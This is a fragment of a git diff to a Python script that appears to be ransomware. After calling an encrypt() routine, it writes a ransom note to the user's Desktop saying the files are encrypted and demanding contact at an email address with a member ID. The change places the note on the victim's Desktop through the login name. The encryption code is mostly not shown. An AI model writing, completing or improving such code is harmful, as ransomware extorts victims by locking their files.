@@ -37,7 +37,9 @@ def encrypt():
                             pass
 
 encrypt()
-with open("nk_readme.txt", 'w') as f:
+
+path = "C:\\Users\\" + os.getlogin() + "\\Desktop\\nk_readme.txt"
+with open(path, 'w') as f:
     f.write("YOUR FILES ARE ENCRYPTED !!!\n")
     f.write("WANT TO GAIN ASSCESS AGAIN ?\n")
     f.write("CONTACT US AT tnkrish02@gmail.com WITH YOUR MEMBER ID\n")
